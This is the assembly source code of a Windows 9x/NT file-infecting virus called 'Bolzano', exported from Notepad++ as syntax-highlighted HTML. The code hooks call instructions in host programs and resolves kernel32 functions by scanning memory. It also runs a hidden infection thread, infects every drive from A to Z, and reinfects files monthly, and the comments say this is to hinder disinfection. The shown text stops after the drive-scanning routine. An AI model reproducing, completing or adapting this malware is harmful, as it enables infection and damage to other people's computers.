<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            ---------------------------------------------------  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                              --- BOLZANO ---</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            ---------------------------------------------------     </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; TASM       /ml /zi BOLZANO</span><span class="sc0">
</span><span class="sc1">; TLINK32  -aa -r -v BOLZANO,,,\TASM\LIB\IMPORT32.LIB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">


</span><span class="sc10">RADIX</span><span class="sc0">        </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc9">ASSUME</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VIRUS</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">VIRUS</span><span class="sc0">


</span><span class="sc5">HOST</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">      </span><span class="sc12">'CODE'</span><span class="sc0">


</span><span class="sc5">MAIN</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the virus infects a programm, it will NOT modify the</span><span class="sc0">
</span><span class="sc1">; original entry point. Instead of that, it will hook (NbHooks) calls</span><span class="sc0">
</span><span class="sc1">; (opcode E8 XX XX XX XX)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">VirCall</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Poly</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HostRoutine</span><span class="sc4">:</span><span class="sc0">
                                     
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; at least one importation is necessary to get a reloc section</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc9">EXTRN</span><span class="sc0">        </span><span class="sc5">Beep</span><span class="sc0">                                   
                                                    
                                                    
</span><span class="sc5">HOST</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the data segment is used since it is writeable</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">SEGMENT</span><span class="sc0">      </span><span class="sc12">'DATA'</span><span class="sc0">


</span><span class="sc5">X</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">

</span><span class="sc5">NbHooks</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc2">32</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; when executed for the first time,</span><span class="sc0">
</span><span class="sc1">; the virus starts here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">VS</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetEIP</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; as the HostCalls data will be modified during the infection,</span><span class="sc0">
</span><span class="sc1">; it must be saved somewhere</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostCalls</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Somewhere</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NbHooks</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; change the Poly routine so that it will directly</span><span class="sc0">
</span><span class="sc1">; jump to ExitVS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Hooker</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B860</span><span class="sc0">
             </span><span class="sc6">stosw</span><span class="sc0">                                  </span><span class="sc1">; pushad</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExitVS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">    </span><span class="sc1">; mov eax,offset ExitVS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0E0FF</span><span class="sc0">
             </span><span class="sc6">stosw</span><span class="sc0">                                  </span><span class="sc1">; jmp near eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; determine on which OS the virus is running</span><span class="sc0">
</span><span class="sc1">; the code may seem strange, but it works</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">OS_Test</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10C00</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">scasb</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Win9x</span><span class="sc0">

</span><span class="sc5">WinNT</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WNT_GPA_Key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">77F00000</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Find_GPA</span><span class="sc0">

</span><span class="sc5">Win9x</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">W9x_GPA_Key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0BFF70000</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; now the virus looks for the GetProcAddress function, in order</span><span class="sc0">
</span><span class="sc1">; to relocate its own imporations</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Find_GPA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">K32_Base</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40000</span><span class="sc0">                 </span><span class="sc1">; GPA search depth</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">ScanKernel32</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Found_GPA</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitVS</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanKernel32</span><span class="sc0">

</span><span class="sc5">Found_GPA</span><span class="sc4">:</span><span class="sc0">
                                               
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_API</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">GetAddresses</span><span class="sc4">:</span><span class="sc0">                                                   

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">K32_Base</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">                  </span><span class="sc1">; edi points to GetProcAddress</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ExitVS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">NextFunction</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFunction</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetAddresses</span><span class="sc0">

</span><span class="sc5">Initialize</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The current month is used by the virus to determine if it has</span><span class="sc0">
</span><span class="sc1">; already infected a program, so every month the virus reinfects</span><span class="sc0">
</span><span class="sc1">; all files on the computer. This makes disinfection harder.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetLocalTime</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus must pass control to the host program quickly, or</span><span class="sc0">
</span><span class="sc1">; it would alert the user. But as infecting the computer takes</span><span class="sc0">
</span><span class="sc1">; a little time, the virus creates a new thread, which will</span><span class="sc0">
</span><span class="sc1">; be executed as the same time as the host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadID</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">   </span><span class="sc1">; lpThreadID</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                    
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; dwCreationFlags</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">                          </span><span class="sc1">; lpParameter</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reproduce</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">  </span><span class="sc1">; lpStartAddress</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                   
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                       
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; dwStackSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateThread</span><span class="sc0">               </span><span class="sc1">; launch viral thread</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the previous version of bolzano hooked the host kernel32 return</span><span class="sc0">
</span><span class="sc1">; address, in order to kill the viral thread when the host thread</span><span class="sc0">
</span><span class="sc1">; terminated. This wasn't necessary, as the infection does not</span><span class="sc0">
</span><span class="sc1">; last long : when every file on the computer is already infected,</span><span class="sc0">
</span><span class="sc1">; it takes less than 20 seconds</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; now give control back to the host</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ExitVS</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetEIP</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; host call return address</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NbHooks</span><span class="sc0">               </span><span class="sc1">; number of calls hooked</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                     </span><span class="sc1">; size of call XXX = 5</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Somewhere</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">GetCall</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsd</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">lodsd</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GotIt</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">GetCall</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; if we get here, something wrong is happening</span><span class="sc0">
</span><span class="sc1">; so the virus will have to skip the host call</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">popad</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; jump to the original call destination</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">BackToHost</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; flush the prefetch buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">BackToHost</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ----------------------------</span><span class="sc0">
</span><span class="sc1">; the viral thread starts here</span><span class="sc0">
</span><span class="sc1">; ----------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Reproduce</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; save ebp, as the Win9x kernel32 requires the original value</span><span class="sc0">
</span><span class="sc1">; when the thread terminates</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetEIP</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; determine the current directory (and consequently the current disk)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">104</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">InitialDisk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                  
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; first, infect the disk on which the virus started</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectDisk</span><span class="sc0">


</span><span class="sc1">; -----------------------------</span><span class="sc0">

</span><span class="sc1">;            pop          ebp          ; for debug</span><span class="sc0">
</span><span class="sc1">;            ret                       ; (useful with subst)</span><span class="sc0">

</span><span class="sc1">; -----------------------------</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; scan local disks from A to Z</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">ScanDisks</span><span class="sc4">:</span><span class="sc0">
                                                  
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; avoid infecting the same disk twice</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3C</span><span class="sc0">
</span><span class="sc5">InitialDisk</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AlreadyDone</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectDisk</span><span class="sc0">

</span><span class="sc5">AlreadyDone</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
             </span><span class="sc6">jna</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanDisks</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
